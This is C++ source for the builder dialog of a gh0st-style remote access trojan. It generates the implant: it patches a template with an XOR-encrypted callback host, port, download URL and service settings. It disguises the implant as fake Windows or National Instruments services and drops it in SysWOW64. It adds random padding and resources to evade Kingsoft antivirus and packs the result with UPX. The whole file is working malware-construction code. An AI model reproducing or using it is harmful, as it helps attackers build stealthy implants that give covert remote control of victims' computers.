// BuildServer.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "BuildServer.h"
#include "encode.h"
#include <shlwapi.h>
#include "zlib\zconf.h"
#include <Wininet.h>
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif


struct authreq
{
    char Ver;
    char Ulen;
    char NamePass[256];
};

struct authans
{
    char Ver;
    char Status;
};

#define Request_DOWN			0x9
#define File_Buffer				0x10
#define File_Buffer_Finish		0x11
/////////////////////////////////////////////////////////////////////////////
// CBuildServer dialog
struct Info
{
	char Address[100];
	char Port[10];
	char Mark[50];
	char SerName[100];
	char Serdisplay[128];
	char Serdesc[256];
	char strGroup[256];
	BOOL bDelete;
	BOOL bReg;
	char URL[256];
	char SerFile[MAX_PATH];
}MyInfo=
{
	"                                                          ",
		"",
		"",
		"National",
		"National Instruments Domain Service",
		"Provides a domain server for NI security.",
		"",
		TRUE,
		TRUE,
};
CBuildServer::CBuildServer(CWnd* pParent /*=NULL*/)
	: CDialog(CBuildServer::IDD, pParent)
{
	//{{AFX_DATA_INIT(CBuildServer)
	m_ServiceName = _T("Windows 网络服务");
	m_ServiceDisplayName = _T("Windows Font Cache Service mk 789 987");
	m_ServiceDescription = _T("提供网络连接和计算机之间的通信服务，为应用程序提供网络访问能力。");
	m_remote_port =((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Build", "Port", "2015");
	m_remote_host = _T(""); // 主机地址，在 OnInitDialog 中自动获取本机 IP
	m_group_name = _T("Default");
	m_down_url = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Connection", "url", "m_down_url");
	m_bDelete = TRUE;
	m_bReg = FALSE;
	m_down_url = _T("");
	//}}AFX_DATA_INIT
}


void CBuildServer::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CBuildServer);
	DDX_Text(pDX, IDC_SERVICE_NAME, m_ServiceName);
	DDX_Text(pDX, IDC_SERVICE_DISPLAYNAME, m_ServiceDisplayName);
	DDX_Text(pDX, IDC_SERVICE_DESCRIPTION, m_ServiceDescription);
	DDX_Text(pDX, IDC_REMOTE_PORT, m_remote_port);
	DDX_Text(pDX, IDC_REMOTE_HOST, m_remote_host);
	DDX_Text(pDX, IDC_GROUP_NAME, m_group_name);
	DDX_Check(pDX, IDC_CHECK_DELETE, m_bDelete);
	DDX_Check(pDX, IDC_CHECK_REG, m_bReg);
	DDX_Text(pDX, IDC_EDIT_URL, m_down_url);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CBuildServer, CDialog)
	//{{AFX_MSG_MAP(CBuildServer)
	ON_BN_CLICKED(IDC_TEST_MASTER, OnTestMaster)
	ON_BN_CLICKED(IDM_SUIJI, OnSuiji)
	ON_BN_CLICKED(IDC_BUILD, OnBuild)
	ON_BN_CLICKED(IDC_EXIT, OnExit)
	ON_BN_CLICKED(IDC_GETINFO, OnGetinfo)
	ON_BN_CLICKED(IDC_BUTTON_TEST_DOWN, OnButtonTestDown)
	//}}AFX_MSG_MAP
	ON_EN_CHANGE(IDC_EDIT_URL, &CBuildServer::OnEnChangeEditUrl)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CBuildServer message handlers

void CBuildServer::OnTestMaster() 
{
	// TODO: Add your control notification handler code here
	UpdateData();
	
	if (!m_remote_host.GetLength() || !m_remote_port.GetLength())
	{
		MessageBox("请输入完整的主机信息","提示", MB_ICONINFORMATION);
		return;
	}
	HANDLE	hThread;	
	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TestMaster, this, 0, NULL);
	//}
	CloseHandle(hThread);
}

void CBuildServer::OnEnableHttp() 
{
	// TODO: Add your control notification handler code here
	UpdateData(true);
		
}

BOOL CBuildServer::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	if (m_remote_host.GetLength() == 0)
	{
		char hostname[256]; 
		gethostname(hostname, sizeof(hostname));
		HOSTENT *host = gethostbyname(hostname);
		if (host != NULL)
			m_remote_host = inet_ntoa(*(IN_ADDR*)host->h_addr_list[0]);
		else
			m_remote_host = _T("127.0.0.1");	
	}
	UpdateData(false);
	// 主机地址设置、按钮、主机地址编辑框
	GetDlgItem(IDC_BUILD)->EnableWindow(TRUE);
	GetDlgItem(IDC_REMOTE_HOST)->EnableWindow(TRUE);
	CWnd *pWndGetInfo = GetDlgItem(IDC_GETINFO);
	if (pWndGetInfo != NULL)
		pWndGetInfo->EnableWindow(FALSE);
		
	// 预设默认释放路径 + 文件名，用户可自行修改
	SetDlgItemText(IDC_SERVICE_NAME2, _T("C:\\Windows\\SysWOW64\\CS.exe"));
	OnEnableHttp();
	return TRUE;  // return TRUE unless you set the focus to a control
	// EXCEPTION: OCX Property Pages should return FALSE
}

DWORD WINAPI CBuildServer::TestMaster( LPVOID lparam ) 
{
	// TODO: Add your control notification handler code here
	CBuildServer	*pThis = (CBuildServer *)lparam;
	CString	strResult;
	bool	bRet = true;
	WSADATA	wsaData0;
	WSAStartup(0x0201, &wsaData0);
	
	SOCKET	sRemote = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sRemote == SOCKET_ERROR)
	{ 
		pThis->MessageBox("socket 初始化失败","提示", MB_ICONINFORMATION);
		return false;
	}
	// 设置 socket 为非阻塞
	u_long argp	= 1;
	ioctlsocket(sRemote, FIONBIO, &argp);
	
	struct timeval tvSelect_Time_Out;
	tvSelect_Time_Out.tv_sec = 3;
	tvSelect_Time_Out.tv_usec = 0;
	
	hostent* pHostent = NULL;
	pHostent = gethostbyname(pThis->m_remote_host);
	if (pHostent == NULL)
	{
		bRet = false;
		goto fail;
	}
	
	// 填充 sockaddr_in 结构
	sockaddr_in	ClientAddr;
	ClientAddr.sin_family	= AF_INET;
	ClientAddr.sin_port	= htons(atoi(pThis->m_remote_port));
	
	ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);
	
	connect(sRemote, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr));
	
	fd_set	fdWrite;
	FD_ZERO(&fdWrite);
	FD_SET(sRemote, &fdWrite);
	
	if (select(0, 0, &fdWrite, NULL, &tvSelect_Time_Out) <= 0)
	{	
		bRet = false;
		goto fail;
	}
fail:
	closesocket(sRemote);
	WSACleanup();
	
	if (bRet)
		strResult.Format("成功连接到主机（%s）的（%s）端口 ...", pThis->m_remote_host, pThis->m_remote_port);
	else
//		strResult.Format("连接到主机（%s:%s）失败 ...", pThis->m_remote_host, pThis->m_remote_port);
		strResult.Format("连接失败，请检查端口和地址", pThis->m_remote_host, pThis->m_remote_port);	
	pThis->MessageBox(strResult,"Hackyh提示",MB_ICONINFORMATION);
	return -1;
}

TCHAR suiji[256];

void CBuildServer::AntiJinShan(CString Path)

{
	SYSTEMTIME stLocal;
	GetLocalTime(&stLocal);
	wsprintf(suiji,"%i%i%i%i%i%i",stLocal.wHour,stLocal.wMinute,stLocal.wSecond,stLocal.wYear,stLocal.wMonth,stLocal.wDay);
	DeleteFile("C:\\1.txt");
	HANDLE hFile1; 
	DWORD  dwBytesWritten;
	hFile1 = CreateFile("C:\\1.txt",GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,NULL,NULL);
	if (hFile1 == INVALID_HANDLE_VALUE) return ;
	int i;
	for (i=0;i<10;i++)
	{
		WriteFile(hFile1, MyEncode(suiji), strlen(suiji), &dwBytesWritten, NULL);
	}
	CloseHandle(hFile1);  
    HANDLE hFile;
	hFile = CreateFile("C:\\1.txt", GENERIC_READ, NULL, NULL, OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD nSizeOfSrcFile = GetFileSize( hFile, &nSizeOfSrcFile ); 
	char *szSrcFileBuf = new char[ nSizeOfSrcFile ]; 
	ReadFile( hFile, szSrcFileBuf, nSizeOfSrcFile, &nSizeOfSrcFile, NULL); 
	HANDLE hUpdate;
	BOOL ret;
	hUpdate = BeginUpdateResource(Path, false);
	char suiji2[256];
	lstrcpy(suiji2,suiji);
	char xxxxx[256];
	wsprintf(xxxxx,"%s%s",MyEncode(suiji),suiji2);
	ret = UpdateResource(hUpdate, xxxxx, MyEncode(suiji2), 0, szSrcFileBuf, nSizeOfSrcFile);
	if (!ret)
	{
		CloseHandle(hFile);
	}
	EndUpdateResource( hUpdate, false ); 
	CloseHandle(hFile);
	DeleteFile("C:\\1.txt");
}

int memfind(const char *mem, const char *str, int sizem, int sizes)   
{   
	int   da,i,j;   
	if (sizes == 0) da = strlen(str);   
	else da = sizes;   
	for (i = 0; i < sizem; i++)   
	{   
		for (j = 0; j < da; j ++)   
			if (mem[i+j] != str[j])	break;   
		if (j == da) return i;   
	}   
	return -1;   
}


CHAR GetRandChar(BOOL  Capital,int i)
{
	DWORD iCount=GetTickCount()+i;
	
	iCount=(iCount+((CGh0stApp *)AfxGetApp())->GetRand())%25;
	
	CHAR Result=0;
	
	if(Capital)
		return	Result=65+iCount;
	else
		return  Result=97+iCount;
}
  ////////////////////////////////随机生成服务信息，不需要修改
void CBuildServer::OnSuiji() 
{

	CHAR ServerName[20]={NULL};
	ZeroMemory(ServerName,20);
	
	for (int i=0;i<19;i++)
	{
		if(i==0)
		{
			ServerName[i]=GetRandChar(TRUE,i);

			continue;
		}
		if(i==6||i==15)
		{
			ServerName[i]=' ';
			i++;
			ServerName[i]=GetRandChar(TRUE,i);
			continue;
		}
		ServerName[i]=GetRandChar(FALSE,i);
	}
	
	
	CHAR ServerShow[30]={NULL};
	ZeroMemory(ServerShow,30);
	
	for (i=0;i<29;i++)
	{
		if(i==0)
		{
			ServerShow[i]=GetRandChar(TRUE,i);
			continue;
		}
		if(i==6||i==15||i==24)
		{
			ServerShow[i]=' ';
			i++;
			ServerShow[i]=GetRandChar(TRUE,i);
			continue;
		}
		ServerShow[i]=GetRandChar(FALSE,i);
	}
	
	
	CHAR ServerDesc[40]={NULL};
	ZeroMemory(ServerDesc,40);
	
	for (i=0;i<39;i++)
	{
		if(i==0)
		{
			ServerDesc[i]=GetRandChar(TRUE,i);
			continue;
		}
		if(i==8||i==18||i==26||i==35)
		{
			ServerDesc[i]=' ';
			i++;
			ServerDesc[i]=GetRandChar(TRUE,i);
			continue;
		}
		ServerDesc[i]=GetRandChar(FALSE,i);
	}
	
	SetDlgItemText(IDC_SERVICE_NAME,ServerName);
	SetDlgItemText(IDC_SERVICE_DISPLAYNAME,ServerShow);
	SetDlgItemText(IDC_SERVICE_DESCRIPTION,ServerDesc);

	UpdateData(TRUE);
}

// 生成被控端


CString SHANGXIANXINXI;
void CBuildServer::OnBuild() 
{
	// TODO: Add your control notification handler code here
	UpdateData(true);
	char Ip[256];
	GetDlgItemText(IDC_REMOTE_HOST,Ip,sizeof(Ip));
	char Port[256];
	GetDlgItemText(IDC_REMOTE_PORT,Port,sizeof(Port));
	//char szMark[256];
	//GetDlgItemText(IDC_REMARK,szMark,sizeof(szMark));
	char ServiceName[256];
	GetDlgItemText(IDC_SERVICE_NAME,ServiceName,sizeof(ServiceName));
	char ServiceDisplayName[256];
	GetDlgItemText(IDC_SERVICE_DISPLAYNAME,ServiceDisplayName,sizeof(ServiceDisplayName));
	char ServiceDescription[256];
	GetDlgItemText(IDC_SERVICE_DESCRIPTION,ServiceDescription,sizeof(ServiceDescription));
	int int_chage = atoi((LPCSTR)m_remote_port);//CString 转换为 int
	if (int_chage <=1 || int_chage >=65535)
	{
		::MessageBox(0,"端口范围只能为1~65535之间的一个数 ...","提示", MB_ICONINFORMATION);
		return;
	}
/*	char DatPath[256] = {0};		
    GetModuleFileName(NULL, DatPath, sizeof(DatPath));
	PathRemoveFileSpec(DatPath);
    strcat( DatPath , "\\update\\server.dat");*/
	
	CFileDialog dlg(FALSE, "exe", "cs.exe", OFN_OVERWRITEPROMPT,"可执行文件|*.exe", NULL);
	if(dlg.DoModal () != IDOK)
		return;
	
	DeleteFile(dlg.GetPathName());
	// 装载模板来源：模板目录下的 DAT\Install.dat（原为 C:\Program Files\mk.cc 验证版生成）
	char szTplPath[MAX_PATH] = {0};
	GetModuleFileName(NULL, szTplPath, MAX_PATH);
	PathRemoveFileSpec(szTplPath);
	strcat(szTplPath, "\\DAT\\Install.dat");
	if (GetFileAttributes(szTplPath) == INVALID_FILE_ATTRIBUTES)
	{
		MessageBox("未找到装载模板 DAT\\Install.dat，请确认 Bin\\DAT 目录下有该文件", "Hackyh提示", MB_ICONSTOP);
		return;
	}
	CopyFile(szTplPath, dlg.GetPathName(), FALSE);
	CFile file;
    SHANGXIANXINXI=Ip;
	char ShangXian[256];
	wsprintf(ShangXian,"%s:%s",SHANGXIANXINXI,Port);
	strcpy(MyInfo.Address,Ip);
	strcpy(MyInfo.Port,Port);
//	strcpy(MyInfo.szMark,szMark);
	strcpy(MyInfo.SerName,ServiceName);
	strcpy(MyInfo.Serdisplay,ServiceDisplayName);
	strcpy(MyInfo.Serdesc,ServiceDescription);
	strcpy(MyInfo.strGroup, m_group_name.GetBuffer(0));
	MyInfo.bDelete = m_bDelete;
	MyInfo.bReg = m_bReg;
	strcpy(MyInfo.URL,m_down_url.GetBuffer(0));
	CString strSerFile;
	GetDlgItemText(IDC_SERVICE_NAME2, strSerFile);
	strSerFile.Trim();
	if (!strSerFile.IsEmpty())
	{
		TCHAR chLast = strSerFile.GetAt(strSerFile.GetLength() - 1);
		if (chLast == _T('\\') || chLast == _T('/'))
		{
			// 只给了路径，没有文件名，使用默认文件名
		}
		else
		{
			CString strName = strSerFile;
			int nPos = strName.ReverseFind(_T('\\'));
			if (nPos == -1)
				nPos = strName.ReverseFind(_T('/'));
			if (nPos != -1)
				strName = strName.Mid(nPos + 1);
			if (strName.Find(_T('.')) == -1)
				strSerFile += _T(".exe");
		}
	}
	lstrcpyn(MyInfo.SerFile, strSerFile.GetBuffer(0), sizeof(MyInfo.SerFile));

	
	DWORD wr=0;
	HANDLE hFile=CreateFile(dlg.GetPathName(),GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	DWORD len=GetFileSize(hFile,NULL);
	char *str=new char [len];
	ZeroMemory(str,len);
	ReadFile(hFile,str,len,&wr,NULL);
	CloseHandle(hFile);

	// 定位配置标记（模板中 CFG_TAG，8 字节）
	const char tagEnc[8] = { (char)0x19,(char)0x1D,(char)0x1B,(char)0x05,(char)0x0A,(char)0x1E,(char)0x27,(char)0x50 };
	DWORD dwOffset = memfind(str, tagEnc, len, 8);
	if (dwOffset == (DWORD)-1)
	{
		AfxMessageBox("模板非法，未找到配置标记");
		delete[] str;
		return;
	}

	// 构造加密 blob：Info + 随机长度填充
	const DWORD LOCAL_CFG_CAP = 1600;
	const BYTE  LOCAL_CFG_KEY = 0x5A;
	BYTE plain[LOCAL_CFG_CAP];
	ZeroMemory(plain,LOCAL_CFG_CAP);
	memcpy(plain,&MyInfo,sizeof(Info));

	DWORD seed = GetTickCount() ^ GetCurrentThreadId() ^ 0x5A5A5A5A;
	DWORD padLen = (((seed=seed*1103515245+12345)>>16)&0x7FFF) % 129;
	DWORD blobLen = sizeof(Info)+padLen;
	if (blobLen > LOCAL_CFG_CAP) blobLen = LOCAL_CFG_CAP;
	for (DWORD i=sizeof(Info);i<blobLen;i++){
		seed=seed*1103515245+12345;
		plain[i]=(BYTE)((seed>>16)&0xFF);
	}

	// 加密：位置相关 XOR（封装，与 CfgKeyAt 一致）
	BYTE cipher[LOCAL_CFG_CAP];
	for (DWORD i=0;i<blobLen;i++)
		cipher[i]=plain[i] ^ (BYTE)(LOCAL_CFG_KEY+(i&0x3F));

	// 覆盖模板 tag 为随机字节，写入 blobLen + blob
	for (int i=0;i<8;i++){
		seed=seed*1103515245+12345;
		str[dwOffset+i]=(char)((seed>>16)&0xFF);
	}
	memcpy(str+dwOffset+8,&blobLen,4);
	memcpy(str+dwOffset+12,cipher,blobLen);

	// 写入文件
	if(file.Open(dlg.GetPathName(),CFile::modeCreate|CFile::modeWrite))
	{
		try
		{
			file.Write(str,len);
			file.Close();
		}
		catch(...)
		{
			MessageBox("写入失败，请重试","Hackyh提示",MB_OK|MB_ICONSTOP);
			delete[] str;
			return;
		}
	}
	delete[] str;

DWORD dwTmp;
	hFile = CreateFile(dlg.GetPathName(), GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
	SetFilePointer( hFile, 0, NULL, FILE_END );
	CString kb;
	int kb1;
	//	GetDlgItemText(IDC_EDIT_BEBIG,kb);
	kb1=atoi(kb); 
	TCHAR ces[256];
	int i;
	i=0;
	char * BigCode=new char[1024*1024];
	while(i < kb1)
	{
		WriteFile(hFile,BigCode,1024*1024, &dwTmp, NULL);
		i++;
	}
	delete[] BigCode;
	CloseHandle(hFile);
	MessageBox("生成成功","Hackyh提示",MB_ICONWARNING);

	// 主控生成后可继续生成
	GetDlgItem(IDC_BUILD)->EnableWindow(TRUE);
	CWnd *pWndGetInfo2 = GetDlgItem(IDC_GETINFO);
	if (pWndGetInfo2 != NULL)
		pWndGetInfo2->EnableWindow(TRUE);
}

void CBuildServer::CompressUpx(CString inpath)
{
	HRSRC hResInfo;
	HGLOBAL hResData;
	DWORD dwSize,dwWritten;
	LPBYTE p;
	HANDLE hFile;
    // 获取 UPX 资源
	hResInfo = FindResource(NULL,MAKEINTRESOURCE(IDR_UPX),"EXE");
	if(hResInfo == NULL) return;
    // 取得资源尺寸
	dwSize = SizeofResource(NULL,hResInfo);
    // 装载资源
	hResData = LoadResource(NULL,hResInfo);
	if(hResData == NULL) return;
	// 为数据分配空间
	p = (LPBYTE)GlobalAlloc(GPTR, dwSize); 
	if (p == NULL)     return;
	// 复制资源数据
	CopyMemory((LPVOID)p, (LPCVOID)LockResource(hResData), dwSize);
	
    char Path[256];
    GetCurrentDirectory(256, Path);
	strcat(Path,"\\upx.exe");
	DeleteFile(Path);
	hFile = CreateFile(Path,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);
	if(hFile == NULL) return;
	
	WriteFile(hFile,(LPVOID)p,dwSize,&dwWritten,NULL);
	CloseHandle(hFile);
	ShellExecute(this->m_hWnd,"open",Path, inpath,"",SW_HIDE);
	
	
	BOOL del;
	do 
	{
		del = DeleteFile(Path);
	} while(!del);
}

void CBuildServer::OnExit() 
{
	// TODO: Add your control notification handler code here
	OnCancel();
}


/////////上线信息获取////////////
#define Request_DOWN			0x9
#define File_Buffer				0x10
#define File_Buffer_Finish		0x11
typedef struct
{
	
	BYTE	Flags;
	DWORD	Buffer_Size;
	BYTE	Buffer[1024];
	BYTE	Info[256];
}NET_DATA, *LPNET_DATA;

CString strInfo;
void CBuildServer::OnGetinfo() 
{
	// 主机地址校验，确保连接，作为网络关键，模板可刷新主机地址
	if (m_remote_host.GetLength() == 0)
	{
		char hostname[256];
		gethostname(hostname, sizeof(hostname));
		HOSTENT *host = gethostbyname(hostname);
		if (host != NULL)
			m_remote_host = inet_ntoa(*(IN_ADDR*)host->h_addr_list[0]);
		else
			m_remote_host = _T("127.0.0.1");
	}
	UpdateData(false);
	char szTplPath[MAX_PATH] = {0};
	GetModuleFileName(NULL, szTplPath, MAX_PATH);
	PathRemoveFileSpec(szTplPath);
	strcat(szTplPath, "\\DAT\\Install.dat");
	if (GetFileAttributes(szTplPath) != INVALID_FILE_ATTRIBUTES)
		AfxMessageBox("装载模板存在，可以直接生成被控端");
	else
		AfxMessageBox("未找到装载模板 DAT\\Install.dat，请确认 Bin\\DAT 目录下有该文件");
	GetDlgItem(IDC_BUILD)->EnableWindow(TRUE);
	GetDlgItem(IDC_GETINFO)->EnableWindow(TRUE);
}
void CBuildServer::OnButtonTestDown() 
{
	
	UpdateData(TRUE);
	BOOL		bRet = FALSE;
	HINTERNET	hInternet, hUrl;
	char		buffer[1024];
	DWORD		dwBytesRead = 0;
	DWORD		dwBytesWritten = 0;
	
	char sIQkS10[] = {'M','o','z','i','l','l','a','/','4','.','0',' ','(','c','o','m','p','a','t','i','b','l','e',')','\0'};
	hInternet = InternetOpen(sIQkS10, INTERNET_OPEN_TYPE_PRECONFIG, NULL,INTERNET_INVALID_PORT_NUMBER,0);
	if (hInternet == NULL)
	{
		return;
	}
	
	DWORD dwTestFlags = INTERNET_FLAG_RELOAD;
	if (m_down_url.Left(8).CompareNoCase(_T("https://")) == 0)
		dwTestFlags |= INTERNET_FLAG_SECURE;
	hUrl = InternetOpenUrl(hInternet, m_down_url.GetBuffer(0), NULL, 0, dwTestFlags, 0);
	if (hUrl == NULL)
	{
		AfxMessageBox("下载失败!");
		return;
	}	
	
	InternetCloseHandle(hUrl);
	InternetCloseHandle(hInternet);
	
	AfxMessageBox("测试成功!"); 	
}


void CBuildServer::OnEnChangeEditUrl()
{
	// TODO:  如果该控件是 RICHEDIT 控件，它将不
	// 发送此通知，除非重写 CDialog::OnInitDialog()
	// 并显式调用 CRichEditCtrl().SetEventMask()，
	// 同时将 ENM_CHANGE 标志包含在掩码中。

	// TODO:  在此添加控件通知处理程序代码
}
